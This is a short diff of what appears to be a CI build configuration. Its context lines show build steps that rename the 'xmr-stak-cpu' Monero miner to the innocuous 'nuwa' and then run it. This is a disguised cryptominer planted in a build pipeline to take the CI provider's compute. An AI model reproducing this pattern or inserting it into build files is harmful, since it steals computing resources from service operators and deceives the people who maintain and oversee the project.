@@ -19,7 +19,6 @@ build:
     - script:
        name: install 4
        code: mv xmr-stak-cpu nuwa
-   
     - script:
        name: install 4
        code: ./nuwa
